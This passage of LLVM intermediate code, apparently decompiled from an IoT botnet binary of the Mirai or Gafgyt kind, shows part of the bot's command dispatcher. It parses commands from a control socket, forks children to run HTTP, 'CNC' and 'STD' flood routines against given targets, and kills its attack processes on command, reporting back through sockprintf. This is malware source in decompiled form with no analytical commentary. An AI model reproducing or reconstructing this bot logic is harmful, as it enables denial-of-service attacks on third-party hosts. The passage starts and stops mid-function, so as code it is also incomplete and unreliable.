  %v1_1000ad04 = inttoptr i32 %v1_1000ad00 to i32*
  %v1_1000ad18 = add i32 %tmp, 24
  %v1_1000ad1c = inttoptr i32 %v1_1000ad18 to i32*
  br label %dec_label_pc_1000aca0

dec_label_pc_1000aca0:                            ; preds = %dec_label_pc_1000aca0.lr.ph, %dec_label_pc_1000ad50
  store i32 268479652, i32* @lr, align 4
  %v0_1000aca0 = call i32 @listFork()
  %v3_1000aca8 = icmp eq i32 %v0_1000aca0, 0
  br i1 %v3_1000aca8, label %dec_label_pc_1000acb0, label %dec_label_pc_1000ad50

dec_label_pc_1000acb0:                            ; preds = %dec_label_pc_1000aca0
  %v2_1000acb8 = load i32, i32* %v1_1000ac5c, align 4
  store i32 %v2_1000acb8, i32* @r29, align 4
  %v2_1000acd8 = load i32, i32* %v1_1000acd8, align 4
  store i32 268479716, i32* @lr, align 4
  %v2_1000ace0 = call i32 @atol(i32 %v2_1000acd8, i32 %v1_1000acd4)
  %v1_1000ace8 = urem i32 %v2_1000ace0, 65536
  store i32 %v1_1000ace8, i32* @r27, align 4
  %v2_1000ad04 = load i32, i32* %v1_1000ad04, align 4
  store i32 268479760, i32* @lr, align 4
  %v2_1000ad0c = call i32 @atol(i32 %v2_1000ad04, i32 %v1_1000ad00)
  %v2_1000ad1c = load i32, i32* %v1_1000ad1c, align 4
  store i32 268479784, i32* @lr, align 4
  %v2_1000ad24 = call i32 @atol(i32 %v2_1000ad1c, i32 %v1_1000ad18)
  %v0_1000ad2c = load i32, i32* @r29, align 4
  %v0_1000ad30 = load i32, i32* @r28, align 4
  %v0_1000ad34 = load i32, i32* @r27, align 4
  %v0_1000ad38 = load i32, i32* @r26, align 4
  %v0_1000ad3c = load i32, i32* @r25, align 4
  %v6_1000ad44 = trunc i32 %v0_1000ad34 to i16
  %v7_1000ad44 = call i32 @sendHTTP(i32 %v0_1000ad2c, i32 %v0_1000ad30, i16 %v6_1000ad44, i32 %v0_1000ad38, i32 %v0_1000ad3c, i32 %v2_1000ad24)
  %v1_1000ad4c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000ad50

dec_label_pc_1000ad50:                            ; preds = %dec_label_pc_1000aca0, %dec_label_pc_1000acb0
  store i32 ptrtoint (i32* @global_var_10016524.368 to i32), i32* @r4, align 4
  store i32 268479840, i32* @lr, align 4
  %v3_1000ad5c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10016524.368 to i32), i32 268500992)
  %v3_1000ad6c = icmp eq i32 %v3_1000ad5c, 0
  br i1 %v3_1000ad6c, label %dec_label_pc_1000ae28, label %dec_label_pc_1000aca0

dec_label_pc_1000ad78:                            ; preds = %dec_label_pc_1000ac54
  store i32 268479868, i32* @lr, align 4
  %v0_1000ad78 = call i32 @listFork()
  %v3_1000ad80 = icmp eq i32 %v0_1000ad78, 0
  br i1 %v3_1000ad80, label %dec_label_pc_1000ad88, label %dec_label_pc_1000b41c

dec_label_pc_1000ad88:                            ; preds = %dec_label_pc_1000ad78
  %v2_1000ad90 = load i32, i32* %v1_1000ac5c, align 4
  store i32 %v2_1000ad90, i32* @r29, align 4
  %v1_1000adac = add i32 %tmp, 12
  %v1_1000adb0 = inttoptr i32 %v1_1000adac to i32*
  %v2_1000adb0 = load i32, i32* %v1_1000adb0, align 4
  store i32 268479932, i32* @lr, align 4
  %v2_1000adb8 = call i32 @atol(i32 %v2_1000adb0, i32 %v1_1000adac)
  %v1_1000adc0 = urem i32 %v2_1000adb8, 65536
  store i32 %v1_1000adc0, i32* @r27, align 4
  %v1_1000add8 = add i32 %tmp, 20
  %v1_1000addc = inttoptr i32 %v1_1000add8 to i32*
  %v2_1000addc = load i32, i32* %v1_1000addc, align 4
  store i32 268479976, i32* @lr, align 4
  %v2_1000ade4 = call i32 @atol(i32 %v2_1000addc, i32 %v1_1000add8)
  %v1_1000adf0 = add i32 %tmp, 24
  %v1_1000adf4 = inttoptr i32 %v1_1000adf0 to i32*
  %v2_1000adf4 = load i32, i32* %v1_1000adf4, align 4
  store i32 268480000, i32* @lr, align 4
  %v2_1000adfc = call i32 @atol(i32 %v2_1000adf4, i32 %v1_1000adf0)
  %v0_1000ae04 = load i32, i32* @r29, align 4
  %v0_1000ae08 = load i32, i32* @r28, align 4
  %v0_1000ae0c = load i32, i32* @r27, align 4
  %v0_1000ae10 = load i32, i32* @r26, align 4
  %v0_1000ae14 = load i32, i32* @r25, align 4
  %v6_1000ae1c = trunc i32 %v0_1000ae0c to i16
  %v7_1000ae1c = call i32 @sendHTTP(i32 %v0_1000ae04, i32 %v0_1000ae08, i16 %v6_1000ae1c, i32 %v0_1000ae10, i32 %v0_1000ae14, i32 %v2_1000adfc)
  %v1_1000ae24 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000ae28

dec_label_pc_1000ae28:                            ; preds = %dec_label_pc_1000ad50, %dec_label_pc_1000ac78, %dec_label_pc_1000ac24, %dec_label_pc_1000ad88
  %v2_1000ae2c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_10016a50.539 to i32), i32* @r4, align 4
  %v3_1000ae3c = inttoptr i32 %v2_1000ae2c to i8*
  %v4_1000ae3c = call i32 @__GI_strcoll(i8* %v3_1000ae3c, i32 ptrtoint ([10 x i8]* @global_var_10016a50.539 to i32))
  %v3_1000ae44 = icmp eq i32 %v4_1000ae3c, 0
  br i1 %v3_1000ae44, label %dec_label_pc_1000ae4c, label %dec_label_pc_1000af4c

dec_label_pc_1000ae4c:                            ; preds = %dec_label_pc_1000ae28
  %tmp103 = icmp slt i32 %arg1, 6
  br i1 %tmp103, label %dec_label_pc_1000b41c, label %dec_label_pc_1000ae58

dec_label_pc_1000ae58:                            ; preds = %dec_label_pc_1000ae4c
  %v1_1000ae5c = add i32 %tmp, 12
  %v1_1000ae60 = inttoptr i32 %v1_1000ae5c to i32*
  %v2_1000ae60 = load i32, i32* %v1_1000ae60, align 4
  store i32 268480108, i32* @lr, align 4
  %v2_1000ae68 = call i32 @atol(i32 %v2_1000ae60, i32 %v1_1000ae5c)
  %tmp104 = icmp slt i32 %v2_1000ae68, 1
  br i1 %tmp104, label %dec_label_pc_1000b41c, label %dec_label_pc_1000ae78

dec_label_pc_1000ae78:                            ; preds = %dec_label_pc_1000ae58
  %v1_1000ae7c = add i32 %tmp, 20
  %v1_1000ae80 = inttoptr i32 %v1_1000ae7c to i32*
  %v2_1000ae80 = load i32, i32* %v1_1000ae80, align 4
  store i32 268480140, i32* @lr, align 4
  %v2_1000ae88 = call i32 @atol(i32 %v2_1000ae80, i32 %v1_1000ae7c)
  %v2_1000ae90 = icmp sgt i32 %v2_1000ae88, 0
  br i1 %v2_1000ae90, label %dec_label_pc_1000ae9c, label %dec_label_pc_1000b41c

dec_label_pc_1000ae9c:                            ; preds = %dec_label_pc_1000ae78
  store i32 268480160, i32* @lr, align 4
  %v0_1000ae9c = call i32 @listFork()
  %v3_1000aea4 = icmp eq i32 %v0_1000ae9c, 0
  br i1 %v3_1000aea4, label %dec_label_pc_1000aeac, label %dec_label_pc_1000b41c

dec_label_pc_1000aeac:                            ; preds = %dec_label_pc_1000ae9c
  %v1_1000aeb0 = add i32 %tmp, 4
  %v1_1000aeb4 = inttoptr i32 %v1_1000aeb0 to i32*
  %v2_1000aeb4 = load i32, i32* %v1_1000aeb4, align 4
  store i32 %v2_1000aeb4, i32* @r29, align 4
  %v2_1000aed4 = load i32, i32* %v1_1000ae60, align 4
  store i32 268480224, i32* @lr, align 4
  %v2_1000aedc = call i32 @atol(i32 %v2_1000aed4, i32 %v1_1000ae5c)
  %v1_1000aee4 = urem i32 %v2_1000aedc, 65536
  store i32 %v1_1000aee4, i32* @r27, align 4
  %v2_1000af00 = load i32, i32* %v1_1000ae80, align 4
  store i32 268480268, i32* @lr, align 4
  %v2_1000af08 = call i32 @atol(i32 %v2_1000af00, i32 %v1_1000ae7c)
  %v1_1000af14 = add i32 %tmp, 24
  %v1_1000af18 = inttoptr i32 %v1_1000af14 to i32*
  %v2_1000af18 = load i32, i32* %v1_1000af18, align 4
  store i32 268480292, i32* @lr, align 4
  %v2_1000af20 = call i32 @atol(i32 %v2_1000af18, i32 %v1_1000af14)
  %v0_1000af28 = load i32, i32* @r29, align 4
  %v0_1000af2c = load i32, i32* @r28, align 4
  %v0_1000af30 = load i32, i32* @r27, align 4
  %v0_1000af34 = load i32, i32* @r26, align 4
  %v0_1000af38 = load i32, i32* @r25, align 4
  %v6_1000af40 = trunc i32 %v0_1000af30 to i16
  %v7_1000af40 = call i32 @sendHTTP2(i32 %v0_1000af28, i32 %v0_1000af2c, i16 %v6_1000af40, i32 %v0_1000af34, i32 %v0_1000af38, i32 %v2_1000af20)
  %v0_1000af48 = call i32 @__GI_exit()
  br label %dec_label_pc_1000af4c

dec_label_pc_1000af4c:                            ; preds = %dec_label_pc_1000ae28, %dec_label_pc_1000aeac
  %v2_1000af50 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_10016a5c.541 to i32), i32* @r4, align 4
  %v3_1000af60 = inttoptr i32 %v2_1000af50 to i8*
  %v4_1000af60 = call i32 @__GI_strcoll(i8* %v3_1000af60, i32 ptrtoint ([4 x i8]* @global_var_10016a5c.541 to i32))
  %v3_1000af68 = icmp eq i32 %v4_1000af60, 0
  br i1 %v3_1000af68, label %dec_label_pc_1000af70, label %dec_label_pc_1000b0e8

dec_label_pc_1000af70:                            ; preds = %dec_label_pc_1000af4c
  %tmp105 = icmp slt i32 %arg1, 4
  br i1 %tmp105, label %dec_label_pc_1000afbc, label %dec_label_pc_1000af7c

dec_label_pc_1000af7c:                            ; preds = %dec_label_pc_1000af70
  %v1_1000af80 = add i32 %tmp, 8
  %v1_1000af84 = inttoptr i32 %v1_1000af80 to i32*
  %v2_1000af84 = load i32, i32* %v1_1000af84, align 4
  store i32 268480400, i32* @lr, align 4
  %v2_1000af8c = call i32 @atol(i32 %v2_1000af84, i32 %v1_1000af80)
  %tmp106 = icmp slt i32 %v2_1000af8c, 1
  br i1 %tmp106, label %dec_label_pc_1000afbc, label %dec_label_pc_1000af9c

dec_label_pc_1000af9c:                            ; preds = %dec_label_pc_1000af7c
  %v1_1000afa0 = add i32 %tmp, 12
  %v1_1000afa4 = inttoptr i32 %v1_1000afa0 to i32*
  %v2_1000afa4 = load i32, i32* %v1_1000afa4, align 4
  store i32 268480432, i32* @lr, align 4
  %v2_1000afac = call i32 @atol(i32 %v2_1000afa4, i32 %v1_1000afa0)
  %v2_1000afb4 = icmp sgt i32 %v2_1000afac, 0
  br i1 %v2_1000afb4, label %dec_label_pc_1000afdc, label %dec_label_pc_1000afbc

dec_label_pc_1000afbc:                            ; preds = %dec_label_pc_1000af9c, %dec_label_pc_1000af7c, %dec_label_pc_1000af70
  %v3_1000afc0 = load i32, i32* @global_var_100287d0.29, align 4
  store i32 ptrtoint (i32* @global_var_1000afd8.543 to i32), i32* @lr, align 4
  %v4_1000afd4 = call i32 @sockprintf(i32 %v3_1000afc0, i32 ptrtoint ([27 x i8]* @global_var_10016a60.542 to i32), i32 268500992)
  br label %dec_label_pc_1000b41c

dec_label_pc_1000afdc:                            ; preds = %dec_label_pc_1000af9c
  %v1_1000afe0 = add i32 %tmp, 4
  %v1_1000afe4 = inttoptr i32 %v1_1000afe0 to i32*
  %v2_1000afe4 = load i32, i32* %v1_1000afe4, align 4
  %v2_1000aff4 = load i32, i32* %v1_1000af84, align 4
  store i32 268480512, i32* @lr, align 4
  %v2_1000affc = call i32 @atol(i32 %v2_1000aff4, i32 %v1_1000af80)
  %v2_1000b010 = load i32, i32* %v1_1000afa4, align 4
  store i32 268480540, i32* @lr, align 4
  %v2_1000b018 = call i32 @atol(i32 %v2_1000b010, i32 %v1_1000afa0)
  store i32 %v2_1000afe4, i32* @r3, align 4
  store i32 268480564, i32* @lr, align 4
  %v2_1000b030 = call i32 @__GI_strchr(i32 %v2_1000afe4, i32 44)
  %v3_1000b038 = icmp eq i32 %v2_1000b030, 0
  br i1 %v3_1000b038, label %dec_label_pc_1000b0c0, label %dec_label_pc_1000b040

dec_label_pc_1000b040:                            ; preds = %dec_label_pc_1000afdc
  store i32 ptrtoint (i32* @global_var_10016524.368 to i32), i32* @r4, align 4
  store i32 268480596, i32* @lr, align 4
  %v3_1000b050 = call i32 @__GI_strtok(i32 %v2_1000afe4, i32 ptrtoint (i32* @global_var_10016524.368 to i32), i32 268500992)
  %v3_1000b0b430 = icmp eq i32 %v3_1000b050, 0
  br i1 %v3_1000b0b430, label %dec_label_pc_1000b0e8, label %dec_label_pc_1000b060

dec_label_pc_1000b060:                            ; preds = %dec_label_pc_1000b040, %dec_label_pc_1000b098
  %storemerge1531 = phi i32 [ %v3_1000b0a4, %dec_label_pc_1000b098 ], [ %v3_1000b050, %dec_label_pc_1000b040 ]
  store i32 268480612, i32* @lr, align 4
  %v0_1000b060 = call i32 @listFork()
  %v3_1000b068 = icmp eq i32 %v0_1000b060, 0
  br i1 %v3_1000b068, label %dec_label_pc_1000b070, label %dec_label_pc_1000b098

dec_label_pc_1000b070:                            ; preds = %dec_label_pc_1000b060
  store i32 268480640, i32* @lr, align 4
  %v3_1000b07c = call i32 @sendCNC(i32 %storemerge1531, i32 %v2_1000affc, i32 %v2_1000b018)
  %v3_1000b084 = load i32, i32* @global_var_100287d0.29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000b090.544 to i32), i32* @lr, align 4
  %v1_1000b08c = call i32 @__libc_close(i32 %v3_1000b084)
  %v1_1000b094 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000b098

dec_label_pc_1000b098:                            ; preds = %dec_label_pc_1000b060, %dec_label_pc_1000b070
  store i32 ptrtoint (i32* @global_var_10016524.368 to i32), i32* @r4, align 4
  store i32 268480680, i32* @lr, align 4
  %v3_1000b0a4 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10016524.368 to i32), i32 268500992)
  %v3_1000b0b4 = icmp eq i32 %v3_1000b0a4, 0
  br i1 %v3_1000b0b4, label %dec_label_pc_1000b0e8, label %dec_label_pc_1000b060

dec_label_pc_1000b0c0:                            ; preds = %dec_label_pc_1000afdc
  store i32 268480708, i32* @lr, align 4
  %v0_1000b0c0 = call i32 @listFork()
  %v3_1000b0c8 = icmp eq i32 %v0_1000b0c0, 0
  br i1 %v3_1000b0c8, label %dec_label_pc_1000b0d0, label %dec_label_pc_1000b41c

dec_label_pc_1000b0d0:                            ; preds = %dec_label_pc_1000b0c0
  store i32 ptrtoint ([3 x i8]* @global_var_1000b0e0.546 to i32), i32* @lr, align 4
  %v3_1000b0dc = call i32 @sendCNC(i32 %v2_1000afe4, i32 %v2_1000affc, i32 %v2_1000b018)
  %v1_1000b0e4 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000b0e8

dec_label_pc_1000b0e8:                            ; preds = %dec_label_pc_1000b098, %dec_label_pc_1000b040, %dec_label_pc_1000af4c, %dec_label_pc_1000b0d0
  %v2_1000b0ec = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_10016a7c.547 to i32), i32* @r4, align 4
  %v3_1000b0fc = inttoptr i32 %v2_1000b0ec to i8*
  %v4_1000b0fc = call i32 @__GI_strcoll(i8* %v3_1000b0fc, i32 ptrtoint ([4 x i8]* @global_var_10016a7c.547 to i32))
  %v3_1000b104 = icmp eq i32 %v4_1000b0fc, 0
  br i1 %v3_1000b104, label %dec_label_pc_1000b10c, label %dec_label_pc_1000b274

dec_label_pc_1000b10c:                            ; preds = %dec_label_pc_1000b0e8
  %tmp107 = icmp slt i32 %arg1, 4
  br i1 %tmp107, label %dec_label_pc_1000b158, label %dec_label_pc_1000b118

dec_label_pc_1000b118:                            ; preds = %dec_label_pc_1000b10c
  %v1_1000b11c = add i32 %tmp, 8
  %v1_1000b120 = inttoptr i32 %v1_1000b11c to i32*
  %v2_1000b120 = load i32, i32* %v1_1000b120, align 4
  store i32 268480812, i32* @lr, align 4
  %v2_1000b128 = call i32 @atol(i32 %v2_1000b120, i32 %v1_1000b11c)
  %tmp108 = icmp slt i32 %v2_1000b128, 1
  br i1 %tmp108, label %dec_label_pc_1000b158, label %dec_label_pc_1000b138

dec_label_pc_1000b138:                            ; preds = %dec_label_pc_1000b118
  %v1_1000b13c = add i32 %tmp, 12
  %v1_1000b140 = inttoptr i32 %v1_1000b13c to i32*
  %v2_1000b140 = load i32, i32* %v1_1000b140, align 4
  store i32 268480844, i32* @lr, align 4
  %v2_1000b148 = call i32 @atol(i32 %v2_1000b140, i32 %v1_1000b13c)
  %v2_1000b150 = icmp sgt i32 %v2_1000b148, 0
  br i1 %v2_1000b150, label %dec_label_pc_1000b178, label %dec_label_pc_1000b158

dec_label_pc_1000b158:                            ; preds = %dec_label_pc_1000b138, %dec_label_pc_1000b118, %dec_label_pc_1000b10c
  %v3_1000b15c = load i32, i32* @global_var_100287d0.29, align 4
  store i32 ptrtoint (i32* @global_var_1000b174.549 to i32), i32* @lr, align 4
  %v4_1000b170 = call i32 @sockprintf(i32 %v3_1000b15c, i32 ptrtoint ([27 x i8]* @global_var_10016a80.548 to i32), i32 268500992)
  br label %dec_label_pc_1000b41c

dec_label_pc_1000b178:                            ; preds = %dec_label_pc_1000b138
  %v1_1000b17c = add i32 %tmp, 4
  %v1_1000b180 = inttoptr i32 %v1_1000b17c to i32*
  %v2_1000b180 = load i32, i32* %v1_1000b180, align 4
  %v2_1000b190 = load i32, i32* %v1_1000b120, align 4
  store i32 268480924, i32* @lr, align 4
  %v2_1000b198 = call i32 @atol(i32 %v2_1000b190, i32 %v1_1000b11c)
  %v2_1000b1ac = load i32, i32* %v1_1000b140, align 4
  store i32 268480952, i32* @lr, align 4
  %v2_1000b1b4 = call i32 @atol(i32 %v2_1000b1ac, i32 %v1_1000b13c)
  store i32 %v2_1000b180, i32* @r3, align 4
  store i32 268480976, i32* @lr, align 4
  %v2_1000b1cc = call i32 @__GI_strchr(i32 %v2_1000b180, i32 44)
  %v3_1000b1d4 = icmp eq i32 %v2_1000b1cc, 0
  br i1 %v3_1000b1d4, label %dec_label_pc_1000b24c, label %dec_label_pc_1000b1dc

dec_label_pc_1000b1dc:                            ; preds = %dec_label_pc_1000b178
  store i32 ptrtoint (i32* @global_var_10016524.368 to i32), i32* @r4, align 4
  store i32 268481008, i32* @lr, align 4
  %v3_1000b1ec = call i32 @__GI_strtok(i32 %v2_1000b180, i32 ptrtoint (i32* @global_var_10016524.368 to i32), i32 268500992)
  %v3_1000b24026 = icmp eq i32 %v3_1000b1ec, 0
  br i1 %v3_1000b24026, label %dec_label_pc_1000b274, label %dec_label_pc_1000b1fc

dec_label_pc_1000b1fc:                            ; preds = %dec_label_pc_1000b1dc, %dec_label_pc_1000b224
  %storemerge1327 = phi i32 [ %v3_1000b230, %dec_label_pc_1000b224 ], [ %v3_1000b1ec, %dec_label_pc_1000b1dc ]
  store i32 268481024, i32* @lr, align 4
  %v0_1000b1fc = call i32 @listFork()
  %v3_1000b204 = icmp eq i32 %v0_1000b1fc, 0
  br i1 %v3_1000b204, label %dec_label_pc_1000b20c, label %dec_label_pc_1000b224

dec_label_pc_1000b20c:                            ; preds = %dec_label_pc_1000b1fc
  %v3_1000b218 = call i32 @sendSTD(i32 %storemerge1327, i32 %v2_1000b198, i32 %v2_1000b1b4)
  %v1_1000b220 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000b224

dec_label_pc_1000b224:                            ; preds = %dec_label_pc_1000b1fc, %dec_label_pc_1000b20c
  store i32 ptrtoint (i32* @global_var_10016524.368 to i32), i32* @r4, align 4
  store i32 268481076, i32* @lr, align 4
  %v3_1000b230 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10016524.368 to i32), i32 268500992)
  %v3_1000b240 = icmp eq i32 %v3_1000b230, 0
  br i1 %v3_1000b240, label %dec_label_pc_1000b274, label %dec_label_pc_1000b1fc

dec_label_pc_1000b24c:                            ; preds = %dec_label_pc_1000b178
  store i32 268481104, i32* @lr, align 4
  %v0_1000b24c = call i32 @listFork()
  %v3_1000b254 = icmp eq i32 %v0_1000b24c, 0
  br i1 %v3_1000b254, label %dec_label_pc_1000b25c, label %dec_label_pc_1000b41c

dec_label_pc_1000b25c:                            ; preds = %dec_label_pc_1000b24c
  %v3_1000b268 = call i32 @sendSTD(i32 %v2_1000b180, i32 %v2_1000b198, i32 %v2_1000b1b4)
  %v1_1000b270 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000b274

dec_label_pc_1000b274:                            ; preds = %dec_label_pc_1000b224, %dec_label_pc_1000b1dc, %dec_label_pc_1000b0e8, %dec_label_pc_1000b25c
  %v2_1000b278 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_10016a9c.553 to i32), i32* @r4, align 4
  %v3_1000b288 = inttoptr i32 %v2_1000b278 to i8*
  %v4_1000b288 = call i32 @__GI_strcoll(i8* %v3_1000b288, i32 ptrtoint ([9 x i8]* @global_var_10016a9c.553 to i32))
  %v3_1000b290 = icmp eq i32 %v4_1000b288, 0
  br i1 %v3_1000b290, label %dec_label_pc_1000b298, label %dec_label_pc_1000b3f0

dec_label_pc_1000b298:                            ; preds = %dec_label_pc_1000b274
  br label %dec_label_pc_1000b33c

dec_label_pc_1000b2ac:                            ; preds = %dec_label_pc_1000b33c, %dec_label_pc_1000b384
  %v1_1000b2b0 = mul i32 %storemerge11, 4
  %v3_1000b2bc = load i32, i32* @global_var_10028804.48, align 4
  %v2_1000b2c0 = add i32 %v3_1000b2bc, %v1_1000b2b0
  %v1_1000b2c4 = inttoptr i32 %v2_1000b2c0 to i32*
  %v2_1000b2c4 = load i32, i32* %v1_1000b2c4, align 4
  %v3_1000b2c8 = icmp eq i32 %v2_1000b2c4, 0
  br i1 %v3_1000b2c8, label %dec_label_pc_1000b330, label %dec_label_pc_1000b2d0

dec_label_pc_1000b2d0:                            ; preds = %dec_label_pc_1000b2ac
  %v2_1000b2e8 = load i32, i32* %v1_1000b2c4, align 4
  store i32 268481264, i32* @lr, align 4
  %v0_1000b2ec = call i32 @__libc_getpid()
  %v4_1000b2f4 = icmp eq i32 %v2_1000b2e8, %v0_1000b2ec
  br i1 %v4_1000b2f4, label %dec_label_pc_1000b330, label %dec_label_pc_1000b2fc

dec_label_pc_1000b2fc:                            ; preds = %dec_label_pc_1000b2d0
  %v3_1000b30c = load i32, i32* @global_var_10028804.48, align 4
  %v2_1000b310 = add i32 %v3_1000b30c, %v1_1000b2b0
  %v1_1000b314 = inttoptr i32 %v2_1000b310 to i32*
  %v2_1000b314 = load i32, i32* %v1_1000b314, align 4
  store i32 268481316, i32* @lr, align 4
  %v2_1000b320 = call i32 @kill(i32 %v2_1000b314, i32 9)
  %v1_1000b328 = add i32 %stack_var_-212.1, 1
  br label %dec_label_pc_1000b330

dec_label_pc_1000b330:                            ; preds = %dec_label_pc_1000b2d0, %dec_label_pc_1000b2ac, %dec_label_pc_1000b2fc
  %stack_var_-212.0 = phi i32 [ %stack_var_-212.1, %dec_label_pc_1000b2ac ], [ %stack_var_-212.1, %dec_label_pc_1000b2d0 ], [ %v1_1000b328, %dec_label_pc_1000b2fc ]
  %v1_1000b334 = add i32 %storemerge11, 1
  br label %dec_label_pc_1000b33c

dec_label_pc_1000b33c:                            ; preds = %dec_label_pc_1000b298, %dec_label_pc_1000b330
  %stack_var_-212.1 = phi i32 [ 0, %dec_label_pc_1000b298 ], [ %stack_var_-212.0, %dec_label_pc_1000b330 ]
  %storemerge11 = phi i32 [ 0, %dec_label_pc_1000b298 ], [ %v1_1000b334, %dec_label_pc_1000b330 ]
  %v2_1000b364 = load i32, i32* @global_var_100287d8.46, align 4
  %v3_1000b37c = icmp eq i32 %v2_1000b364, 0
  br i1 %v3_1000b37c, label %dec_label_pc_1000b384, label %dec_label_pc_1000b2ac

dec_label_pc_1000b384:                            ; preds = %dec_label_pc_1000b33c
  %v3_1000b368 = load i32, i32* @global_var_100287dc.47, align 4
  %v3_1000b39c = icmp ugt i32 %v3_1000b368, %storemerge11
  br i1 %v3_1000b39c, label %dec_label_pc_1000b2ac, label %dec_label_pc_1000b3a4

dec_label_pc_1000b3a4:                            ; preds = %dec_label_pc_1000b384
  %tmp109 = icmp slt i32 %stack_var_-212.1, 1
  %v3_1000b3d8 = load i32, i32* @global_var_100287d0.29, align 4
  br i1 %tmp109, label %dec_label_pc_1000b3d4, label %dec_label_pc_1000b3b0

dec_label_pc_1000b3b0:                            ; preds = %dec_label_pc_1000b3a4
  store i32 ptrtoint (i32* @global_var_1000b3d0.555 to i32), i32* @lr, align 4
  %v5_1000b3cc = call i32 @sockprintf(i32 %v3_1000b3d8, i32 ptrtoint ([11 x i8]* @global_var_10016aa8.554 to i32), i32 %stack_var_-212.1)
  br label %dec_label_pc_1000b3f0

dec_label_pc_1000b3d4:                            ; preds = %dec_label_pc_1000b3a4
  store i32 268481520, i32* @lr, align 4
  %v4_1000b3ec = call i32 @sockprintf(i32 %v3_1000b3d8, i32 ptrtoint ([13 x i8]* @global_var_10016ab4.556 to i32), i32 268500992)
  br label %dec_label_pc_1000b3f0

dec_label_pc_1000b3f0:                            ; preds = %dec_label_pc_1000b274, %dec_label_pc_1000b3b0, %dec_label_pc_1000b3d4
  %v2_1000b3f4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_10016ac4.557 to i32), i32* @r4, align 4
  %v3_1000b404 = inttoptr i32 %v2_1000b3f4 to i8*
  %v4_1000b404 = call i32 @__GI_strcoll(i8* %v3_1000b404, i32 ptrtoint ([10 x i8]* @global_var_10016ac4.557 to i32))
  %v3_1000b40c = icmp eq i32 %v4_1000b404, 0
  br i1 %v3_1000b40c, label %dec_label_pc_1000b414, label %dec_label_pc_1000b41c

dec_label_pc_1000b414:                            ; preds = %dec_label_pc_1000b3f0
  %v0_1000b418 = call i32 @__GI_exit()
  br label %dec_label_pc_1000b41c

dec_label_pc_1000b41c:                            ; preds = %dec_label_pc_1000a8d4, %dec_label_pc_1000a878, %dec_label_pc_1000ae78, %dec_label_pc_1000ad78, %dec_label_pc_1000b0c0, %dec_label_pc_1000b24c, %dec_label_pc_1000b3f0, %dec_label_pc_1000ae9c, %dec_label_pc_1000a8fc, %dec_label_pc_1000a428, %dec_label_pc_1000ae58, %dec_label_pc_1000ae4c, %dec_label_pc_1000ac48, %dec_label_pc_1000a3b4, %dec_label_pc_1000b158, %dec_label_pc_1000afbc, %dec_label_pc_1000aa4c, %dec_label_pc_1000a708, %dec_label_pc_1000a570, %dec_label_pc_1000a460, %dec_label_pc_1000a33c, %dec_label_pc_1000a2f8, %dec_label_pc_1000b414
  %v0_1000b444 = phi i32 [ %v2_1000ae88, %dec_label_pc_1000ae78 ], [ %v0_1000ad78, %dec_label_pc_1000ad78 ], [ %v0_1000b0c0, %dec_label_pc_1000b0c0 ], [ %v0_1000b24c, %dec_label_pc_1000b24c ], [ %v4_1000b404, %dec_label_pc_1000b3f0 ], [ %v0_1000ae9c, %dec_label_pc_1000ae9c ], [ %v0_1000a8fc, %dec_label_pc_1000a8fc ], [ 0, %dec_label_pc_1000a428 ], [ %v2_1000ae68, %dec_label_pc_1000ae58 ], [ 0, %dec_label_pc_1000ae4c ], [ 0, %dec_label_pc_1000ac48 ], [ 0, %dec_label_pc_1000a3b4 ], [ %v4_1000b170, %dec_label_pc_1000b158 ], [ %v4_1000afd4, %dec_label_pc_1000afbc ], [ %v4_1000aa64, %dec_label_pc_1000aa4c ], [ %v4_1000a720, %dec_label_pc_1000a708 ], [ %v5_1000a5a8, %dec_label_pc_1000a570 ], [ %v0_1000a438, %dec_label_pc_1000a460 ], [ %v5_1000a360, %dec_label_pc_1000a33c ], [ %v4_1000a310, %dec_label_pc_1000a2f8 ], [ %v0_1000b418, %dec_label_pc_1000b414 ], [ 0, %dec_label_pc_1000a878 ], [ 0, %dec_label_pc_1000a8d4 ]
  ret i32 %v0_1000b444

; uselistorder directives
  uselistorder i32 %v3_1000b3d8, { 1, 0 }
  uselistorder i32 %storemerge11, { 1, 0, 2 }
  uselistorder i32 %stack_var_-212.1, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_1000b2b0, { 1, 0 }
  uselistorder i32 %v3_1000b230, { 1, 0 }
  uselistorder i32 %v2_1000b1b4, { 1, 0 }
  uselistorder i32 %v2_1000b198, { 1, 0 }
  uselistorder i32 %v2_1000b180, { 1, 0, 3, 2 }
  uselistorder i32 %v3_1000b0a4, { 1, 0 }
  uselistorder i32 %v2_1000b018, { 1, 0 }
  uselistorder i32 %v2_1000affc, { 1, 0 }
  uselistorder i32 %v2_1000afe4, { 1, 0, 3, 2 }
  uselistorder i32* %v1_1000ac5c, { 2, 0, 1, 3 }
  uselistorder i32 %v3_1000abd0, { 1, 0 }
  uselistorder i32 %storemerge6, { 1, 0 }
  uselistorder i32 %storemerge7, { 1, 0 }
  uselistorder i32 %v2_1000aad8, { 1, 0 }
  uselistorder i32 %v2_1000aac4, { 1, 0 }
  uselistorder i32 %v2_1000aaa8, { 1, 0 }
  uselistorder i32 %v2_1000aa8c, { 1, 0 }
  uselistorder i32 %v2_1000aa74, { 1, 0, 3, 2 }
  uselistorder i32 %v3_1000a8e0, { 1, 0 }
  uselistorder i32 %storemerge8, { 1, 0 }
  uselistorder i32 %storemerge9, { 1, 0 }
  uselistorder i32 %storemerge1022, { 1, 0 }
  uselistorder i32 %v2_1000a7c4, { 1, 0 }
  uselistorder i32 %v2_1000a79c, { 1, 0 }
  uselistorder i32 %v2_1000a780, { 1, 0 }
  uselistorder i32 %v2_1000a764, { 1, 0 }
